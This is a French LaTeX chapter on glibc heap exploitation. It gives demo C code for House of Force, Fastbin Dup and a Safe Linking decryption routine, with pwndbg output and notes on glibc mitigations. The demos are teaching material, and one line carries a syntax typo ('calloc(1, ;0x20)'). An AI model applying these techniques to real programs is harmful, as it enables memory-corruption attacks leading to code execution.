\section{Techniques d'exploitation : Des méthodes historiques aux approches modernes}

% -----------------------------------------------------------------------------
\subsection{Vulnérabilités et Primitives}

Avant de détailler les techniques d'exploitation à proprement parler, il est essentiel de définir les vulnérabilités de base («~bugs~») qui permettent de les déclencher. Ces erreurs de programmation sont la porte d'entrée incontournable pour manipuler l'allocateur.

\subsubsection{Erreurs de cycle de vie (Dangling Pointers)}

\paragraph{Use-After-Free (UAF) :} Utilisation d'un pointeur vers un chunk après sa libération. Permet de lire des métadonnées (pour un \textit{leak}) ou de corrompre des pointeurs de chaînage (\texttt{next}/\texttt{fd}). (Ex: \textit{Tcache Poisoning}, \textit{House of Botcake})

\paragraph{Double Free :} Libération multiple d'un même chunk. Provoque des boucles dans les bins et permet d'obtenir deux pointeurs sur la même zone mémoire (\textit{aliasing}). (Ex: \textit{Fastbin Dup}, \textit{Tcache Dup})

\paragraph{Invalid Free :} Appel de \texttt{free()} sur une adresse qui n'est pas le début d'un chunk valide (par exemple : milieu d'un chunk ou adresse sur la pile). (Ex: \textit{House of Spirit})

\subsubsection{Erreurs de limites (Memory Corruption)}

\paragraph{Heap Overflow / Out-of-Bounds (OOB) :} Écriture au-delà de la zone allouée. Cible volontairement les métadonnées du chunk suivant (champ \texttt{size}, bit \texttt{PREV\_INUSE}). (Ex: \textit{House of Force}, \textit{Overlapping Chunks})

\paragraph{Off-by-one :} Cas particulier d'overflow où seul un unique octet est écrit au-delà de la limite (souvent un octet nul \verb|\0|). C'est souvent suffisant pour déclencher une consolidation invalide. (Ex: \textit{Poison Null Byte})

\subsubsection{Des vulnérabilités aux primitives d'exploitation}

Les erreurs détaillées ci-dessus ne sont généralement pas une fin en soi. Elles sont manipulées via les techniques que nous allons décrire pour obtenir des primitives:

\begin{itemize}
    \item \textbf{Arbitrary Write :} Capacité d'écrire une valeur contrôlée à une adresse arbitraire. C'est le but ultime (souvent via un détournement de pointeur de fonction) permettant de rediriger le flux de contrôle.
    \item \textbf{Arbitrary Read :} Capacité de lire le contenu de n'importe quelle adresse mémoire. Indispensable pour récupérer systématiquement les \textit{leaks} nécessaires afin de neutraliser et s'adapter à la randomisation \textit{ASLR}.
\end{itemize}

Nous présenterons dans les sections suivantes l'évolution des \textit{techniques d'exploitation} qui lient ces vulnérabilités fondamentales à nos primitives.

\subsubsection{Heap Feng Shui (Heap Grooming)}

Le \textit{heap feng shui}, ou \textit{heap grooming}, désigne un ensemble de techniques visant à façonner la disposition de la heap afin de créer une configuration mémoire favorable à l'exploitation.
L'idée est de manipuler précisément la structure du tas en effectuant des allocations et libérations de tailles soigneusement choisies, de manière à positionner des chunks à des emplacements stratégiques.
Le nom fait référence au feng shui, un système esthétique chinois ancien reposant sur l'alignement optimal des éléments dans l'espace.

Le heap feng shui s'avère particulièrement utile lorsqu'on souhaite qu'un chunk
contrôlé se retrouve à un emplacement précis et prévisible dans la heap,
par exemple pour positionner un chunk victime juste après un chunk
vulnérable (voir la section sur le \textit{Largebin Attack} pour une illustration concrète).

\subsection{Évolution des techniques et vecteurs limités}

\subsubsection{House of Force}

\noindent\textbf{Fichier de référence :} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c}{\texttt{house\_of\_force.c}}

\paragraph{Vue d'ensemble :}
Le \textit{House of Force} est une ancienne technique de corruption de la mémoire. Elle cible le \textit{Top Chunk}, qui représente la mémoire libre restante à la fin du tas (heap). En modifiant le champ \texttt{size} du Top Chunk, un attaquant force l'espace d'adressage virtuel à boucler sur lui-même (wrap around). Cela trompe \texttt{malloc} et l'oblige à renvoyer un pointeur vers n'importe quelle adresse cible souhaitée.

\paragraph{Fonctionnement de l'attaque :}
Pour exécuter cette attaque, il faut d'abord une vulnérabilité de type \textit{heap overflow} (dépassement de tas) pour écraser les métadonnées du Top Chunk. L'attaquant écrase le champ \texttt{size} avec la valeur entière non signée maximale. Sur une architecture x64, cette valeur est \texttt{0xffffffffffffffff} ($-1$).

\paragraph{Démonstration par le code :}

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>

int main() {
    long target_variable = 0; // La variable que nous voulons écraser

    // 1. Allocation initiale pour s'approcher du Top Chunk
    long *ptr = malloc(0x100);

    // 2. Vulnérabilité : Heap Overflow écrasant la taille du Top Chunk
    // En réalité, cela se ferait via une fonction vulnérable (ex: strcpy).
    // Ici, nous simulons l'écrasement en pointant directement sur le header.
    long *top_chunk_size = ptr + (malloc_usable_size(ptr) / sizeof(long));
    *top_chunk_size = -1; // 0xffffffffffffffff

    // 3. Calcul de la distance (Evil_Size)
    // Distance = Cible - Top_Chunk_Actuel - (4 * sizeof(long))
    long evil_size = (long)&target_variable - (long)top_chunk_size - 0x20;

    // 4. Allocation pont (Bridge allocation)
    // malloc avance le pointeur du Top Chunk en utilisant notre taille calculée.
    // L'entier déborde (integer overflow) et boucle l'espace d'adressage.
    malloc(evil_size);

    // 5. L'exploitation
    // La prochaine allocation retournera l'adresse exacte de notre cible.
    long *arbitrary_write = malloc(0x20);
    *arbitrary_write = 0xDEADBEEF;

    return 0;
}
\end{minted}

La taille étant maintenant à sa limite maximale, la GLIBC considère que le Top Chunk couvre
l'intégralité de l'espace mémoire virtuel. L'attaquant calcule ensuite la distance exacte pour
atteindre l'adresse cible en utilisant cette formule :

$$Evil\_Size = Target\_Address - \space{10} Top\_Chunk\_Address - (4 \times \text{sizeof(long)})$$


Ensuite, l’attaquant effectue un appel à \texttt{malloc} en utilisant la taille
précédemment calculée. La GLIBC traite cette requête en avançant le pointeur du
Top Chunk. En raison du débordement d’entier (integer overflow), l’adresse mémoire
« boucle » dans l’espace utilisateur (wrap around). Le nouveau Top Chunk se
retrouve alors positionné juste avant l’adresse cible.

On soustrait $(4 \times \text{sizeof(long)})$ car \texttt{malloc} va créer un
chunk minimal pour conserver la cohérence du tas,
composé d’un champ \texttt{prev\_size} (8~octets), d’un champ
\texttt{size} (8~octets) et d’un payload minimal aligné sur 16~octets, soit un
total de 32~octets (\texttt{0x20}).

L'appel \texttt{malloc} suivant renverra un chunk qui chevauche directement la cible.

\paragraph{Limitations et renforcement de la GLIBC :}
Le \textit{House of Force} est totalement obsolète sur les systèmes d'exploitation modernes. La GLIBC version 2.29 a neutralisé ce vecteur d'attaque en ajoutant une vérification stricte d'intégrité. La GLIBC moderne compare désormais le champ \texttt{size} du Top Chunk avec les limites physiques réelles de l'arène principale (main arena).

Si le champ de taille dépasse les limites de mémoire réelles, la GLIBC arrête immédiatement le programme et déclenche une erreur \texttt{malloc(): corrupted top size}. En raison de cette atténuation, cette technique ne peut plus être utilisée dans l'exploitation moderne.

\subsubsection{Fastbin Dup}

\noindent\textbf{Fichier de Référence:} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/fastbin_dup.c}{\texttt{fastbin\_dup.c}}

\paragraph{Vue d'ensemble:}
Le \textit{Fastbin Dup} est une vulnérabilité classique de type \textit{double free}. Elle cible les Fastbins, des listes simplement chaînées LIFO. Le but de cette attaque est de tromper malloc pour qu'il place exactement le même bloc de mémoire deux fois dans une même Fastbin. Cela crée une liste circulaire, permettant d'écraser le pointeur \texttt{fd} et de détourner la prochaine allocation mémoire.

\paragraph{Fonctionnement de l'attaque:}
Le Fastbin vérifie uniquement si le bloc en train d'être libéré est en tête de la liste. Par exemple, si nous exécutons \texttt{free(A)} puis de nouveau \texttt{free(A)}, le programme plantera avec une erreur \textit{double free}.

Cependant, un attaquant peut contourner cette vérification simple en libérant un bloc différent entre les deux. Par exemple, en exécutant \texttt{free(A)}, puis \texttt{free(B)}, puis \texttt{free(A)}. La liste Fastbin ressemble maintenant à ça: \texttt{A -> B -> A}.

\paragraph{Démonstration par le code:}

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
#include <stdlib.h>

int main() {
    // 1. Saturation du Tcache (7 chunks) pour forcer l'usage des Fastbins
    void *tcache[7];
    for(int i=0; i<7; i++) tcache[i] = malloc(0x20);
    for(int i=0; i<7; i++) free(tcache[i]);

    // 2. Allocation initiale des chunks cibles
    // calloc est utilisé pour contourner le comportement du Tcache,
    // car il n'utilise jamais les chunks stockés dans le tcache pour ses allocations.
    long *a = calloc(1, 0x20);
    long *b = calloc(1, 0x20);

    // 3. Vulnérabilité : Double Free dans le Fastbin
    free(a);
    free(b);
    free(a); // Contournement: La liste est maintenant A -> B -> A

    // 4. Exploitation : Récupération des pointeurs
    long *c = calloc(1, 0x20); // Retourne le pointeur 'a'
    long *d = calloc(1, ;0x20); // Retourne le pointeur 'b'
    long *e = calloc(1, 0x20); // Retourne le pointeur 'a' à nouveau !

    // L'attaquant possède maintenant deux pointeurs (c et e) 
    // qui pointent vers la même adresse physique.
    return 0;
}
\end{minted}

\begin{pwndbg}[bins]{text}
    tcachebins
    empty
    fastbins
    0x20: 0x5555555593e0 !\textcolor{pwndbgblue}{->}! 0x555555559400 !\textcolor{pwndbgblue}{<-}! !\textcolor{pwndbgred}{0x5555555593e0 (loop)}!
    unsortedbin
    empty
    smallbins
    empty
    largebins
    empty
\end{pwndbg}

Étant donné que la liste est corrompue, lorsque l'application alloue à nouveau ces chunks, l'allocateur renvoie deux pointeurs vers exactement le même espace mémoire physique. L'attaquant peut utiliser le premier pointeur pour écrire une adresse cible dans le pointeur \texttt{fd} du chunk. La prochaine fois que l'allocateur retirera un chunk du Fastbin, il suivra aveuglément ce pointeur \texttt{fd} corrompu et renverra l'adresse cible de l'attaquant.

\paragraph{Limitations et renforcement de la GLIBC :}
Bien que la séquence \texttt{free(A) -> free(B) -> free(A)} fonctionne encore techniquement dans la GLIBC 2.41, l'exploiter est difficile aujourd'hui car la surface d'attaque est considérablement réduite.

Pour exécuter cette attaque dans un environnement moderne, un attaquant doit déjouer trois principales mesures d'atténuation :
\begin{enumerate}
    \item \textbf{Priorité du Tcache (GLIBC 2.41+) :} L'attaquant doit d'abord remplir complètement le Tcache avant que l'allocateur n'envoie les chunks libérés dans les Fastbins. Ensuite, il doit vider complètement le Tcache avant de pouvoir récupérer le chunk corrompu depuis le Fastbin.
    \item \textbf{Safe Linking (GLIBC 2.32+) :} L'attaquant ne peut pas se contenter d'écrire une adresse cible brute dans le chunk. Les pointeurs \texttt{fd} sont protégés par un chiffrement XOR mathématique. L'attaquant doit donc impérativement posséder une fuite de mémoire (heap leak) préalable pour calculer le pointeur masqué (mangled) correct.
    \item \textbf{La mort des Hooks (GLIBC 2.34+) :} La GLIBC a complètement supprimé les hooks d'exécution tels que \texttt{\_\_malloc\_hook} et \texttt{\_\_free\_hook}. Par le passé, les attaquants utilisaient Fastbin Dup pour écraser ces hooks afin d'obtenir instantanément l'exécution de code. Aujourd'hui, même si un attaquant réussit une écriture arbitraire en utilisant Fastbin Dup, il n'y a plus de pointeurs de fonction GLIBC simples et statiques à écraser. Il sera contraint de cibler des éléments internes complexes de la GLIBC (comme les structures \texttt{\_IO\_FILE}) ou de se rabattre sur des vulnérabilités au niveau de l'application elle-même.
\end{enumerate}

\paragraph{Variantes et extensions :}
L'attaque classique présentée ici sert de base à des scénarios plus complexes permettant de contourner des contraintes spécifiques de l'application ou de l'allocateur.

\begin{itemize}
    \item \textbf{\texttt{fastbin\_dup\_consolidate.c} :} Cette variante permet d'effectuer un \textit{double free} sur le même chunk A consécutivement (\texttt{free(A); free(A);}) sans passer par un chunk intermédiaire B. L'astuce consiste à forcer une consolidation de la mémoire (via une allocation large déclenchant \texttt{malloc\_consolidate}) entre les deux appels à \texttt{free}. Cela déplace le premier chunk A du Fastbin vers l'Unsorted Bin, vidant ainsi la tête du Fastbin et neutralisant la vérification immédiate de l'allocateur.
    \item \textbf{\texttt{fastbin\_dup\_into\_stack.c} :} Il s'agit de l'application concrète du détournement de pointeur fd. Une fois le \textit{double free} réussi, l'attaquant forge un pointeur vers une adresse de la pile. Pour que \texttt{malloc} accepte de retourner ce bloc, l'attaquant doit s'assurer qu'une valeur cohérente avec la taille du bin (ex: 0x20 ou 0x30) est présente à l'emplacement mémoire simulant le champ \texttt{size} du faux chunk sur la pile.
\end{itemize}

% -----------------------------------------------------------------------------
\subsection{Techniques d'exploitation en 2026 (GLIBC 2.40/2.41)}

\subsubsection{Bypass de Safe Linking}

\noindent\textbf{Fichier de Référence:} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/decrypt_safe_linking.c}{\texttt{decrypt\_safe\_linking.c}}

Le mécanisme de \textit{Safe Linking}, introduit dans la GLIBC 2.32, vise à protéger les pointeurs de la \textit{freelist} (\textit{Tcache} et \textit{Fastbins}) contre les attaques comme \textit{Tcache Poisoning}. L'algorithme masque le pointeur $P$ en utilisant l'adresse de son propre emplacement mémoire $L$.

L'opération repose sur un XOR-shift déterministe :
$$C = (L \gg 12) \oplus P$$

\paragraph{Analyse de la Vulnérabilité}
Bien que cette protection complexifie l'exploitation à l'aveugle, elle ne constitue pas une barrière cryptographique forte. Deux propriétés structurelles permettent son inversion :
\begin{enumerate}
    \item Du fait du décalage de 12 bits vers la droite, les 12 bits de poids fort du masque sont nuls. Par conséquent, les 12 bits les plus significatifs du chiffré sont stockés en clair : $C_{63:52} = P_{63:52}$.
    \item La structure du XOR-shift permet de propager la connaissance des bits déchiffrés d'un bloc de 12 bits vers le suivant.
\end{enumerate}

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
/* 
 * ATTENTION: Cet algorithme suppose que l'adresse de stockage 
 * et le pointeur partagent la même base (L >> 12 == P >> 12).
 * Il ne fonctionne de manière fiable que si l'ASLR est désactivé 
 * (ce qui est le cas par défaut lors du débogage sous pwndbg).
 */
long decrypt(long cipher) {
    long key = 0;
    long plain;
    for(int i = 1; i < 6; i++) {
        int bits = 64 - 12 * i;
        if(bits < 0) bits = 0;
        plain = ((cipher ^ key) >> bits) << bits;
        key = plain >> 12;
    }
    return plain;
}
\end{minted}

Avec cette méthode, la récupération des pointeurs en clair est réalisable après une fuite mémoire.

Le diagramme suivant illustre l'algorithme de déchiffrement:

\begin{figure}[H]
    \centering
    \begin{tikzpicture}[
            node distance=1.2cm,
            bitbox/.style={draw, minimum width=2.2cm, minimum height=0.8cm, font=\ttfamily\small, outer sep=0pt},
            mask/.style={fill=gray!15},
            plain/.style={fill=green!10},
            cipher/.style={fill=blue!5},
            key/.style={fill=yellow!10},
            arrow/.style={-Stealth, thick},
            cascade/.style={-Stealth, red!80!black, dashed, line width=0.8pt},
            separator/.style={gray!30, dashed, line width=0.5pt},
            label/.style={font=\sffamily\scriptsize\bfseries}
        ]

        % --- LABELS DE L'INDICE i (AU TOP) ---
        \node[font=\sffamily\small\bfseries, gray] at (0, 1.2) {$i=1$};
        \node[font=\sffamily\small\bfseries, gray] at (3.5, 1.2) {$i=2$};
        \node[font=\sffamily\small\bfseries, gray] at (7.8, 1.2) {$i=5$ (Final)};

        % --- COLONNES ---
        % i=1 : Le masque est nul car L >> 12 sur les 12 bits de tête est 0
        \node[bitbox, cipher] (C1) at (0, 0) {$P_{63:52} \oplus 0$};
        \node[draw, circle, inner sep=1pt, fill=white, font=\small] (xor1) at (0, -1.2) {$\oplus$};
        \node[bitbox, mask, left=0.6cm of xor1] (M1) {00\dots00};
        \node[bitbox, plain] (P1) at (0, -2.4) {$P_{63:52}$};

        % i=2 : Le masque est le segment précédent déchiffré
        \node[bitbox, cipher] (C2) at (3.5, 0) {$P_{51:40} \oplus P_{63:52}$};
        \node[draw, circle, inner sep=1pt, fill=white, font=\small] (xor2) at (3.5, -1.2) {$\oplus$};
        \node[bitbox, key, left=0.6cm of xor2] (M2) {$Key_{2}$};
        \node[bitbox, plain] (P2) at (3.5, -2.4) {$P_{51:40}$};

        % i=5 : Round final
        \node[bitbox, cipher] (C5) at (7.8, 0) {$P_{15:0} \oplus P_{27:16}$};
        \node[draw, circle, inner sep=1pt, fill=white, font=\small] (xor5) at (7.8, -1.2) {$\oplus$};
        \node[bitbox, key, left=0.6cm of xor5] (M5) {$Key_{5}$};
        \node[bitbox, plain] (P5) at (7.8, -2.4) {$P_{15:0}$};

        % --- CONNECTEURS NOIRS ---
        \foreach \i in {1,2,5} {
                \draw[arrow] (C\i.south) -- (xor\i.north);
                \draw[arrow] (xor\i.south) -- (P\i.north);
                \draw[arrow] (M\i.east) -- (xor\i.west);
            }

        % --- CASCADE (Seulement la flèche de gauche) ---
        \draw[cascade] (P1.east) -| (M2.south)
        node[pos=0.2, above, font=\tiny, text=red!80!black] {$\gg 12$};

        % --- ESTHÉTIQUE & LABELS ---
        \draw[separator] (1.75, 1.4) -- (1.75, -3.2);
        \draw[separator] (6.5, 1.4) -- (6.5, -3.2);

        \node at (5.2, 0) {\dots}; \node at (5.2, -1.2) {\dots}; \node at (5.2, -2.4) {\dots};

        \node[label, left=0cm of M1] {Key};
        \node[label, left=0.8cm of C1] {C (Cipher)};
        \node[label, left=0.8cm of P1] {P (Plain)};

    \end{tikzpicture}
    \caption{Processus itératif de déchiffrement}
    \label{fig:decrypt_safelinking}
\end{figure}

\paragraph{Nécessité d'une fuite mémoire}
L'efficacité du \textit{Safe Linking} repose sur l'hypothèse que l'attaquant ne connaît pas le masque $L \gg 12$. Par conséquent, l'exploitation nécessite désormais une fuite mémoire pour :
\begin{enumerate}
    \item Récupérer un \textit{cipher} $C$ stocké en mémoire.
    \item Inverser l'algorithme pour retrouver $P$ et, par extension, l'entropie de l'ASLR du tas.
\end{enumerate}